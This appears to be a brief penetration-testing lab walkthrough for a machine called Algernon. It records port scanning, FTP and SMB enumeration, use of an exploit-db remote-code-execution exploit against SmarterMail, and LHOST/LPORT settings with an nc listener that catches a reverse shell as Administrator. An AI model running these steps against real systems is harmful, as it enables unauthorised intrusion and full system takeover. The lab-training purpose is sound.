@@ -1,0 +1,41 @@
+Algernon
+
+192.168.226.65
+
+nmap -p- -A -T4 -sC 192.168.226.65
+FTP enumeration
+anonymous allowed
+download all files 
+mget * .
+Access denied for all
+
+SMB enumeration using enum4linux  (no result)
+
+http enumeration
+
+http://192.168.226.65:9998
+looks like useful
+I found version from sourcecode 
+
+has remotecod execution vulnerability 
+searchsploit smartermail
+windows/remote/49216.py
+
+locate windows/remote/49216.py
+cp /usr/share/exploitdb/exploits/windows/remote/49216.py .
+nano 49216.py
+
+HOST='192.168.226.65'
+PORT=17001
+LHOST='192.168.45.153'
+LPORT=4444
+
+nc -nvlp 4444
+got shell
+
+systeminfo
+whoami
+I am system Administrator no need for local privilege escalation
+
+cd C:\users\Administrator\Desktop
+cat proof.txt
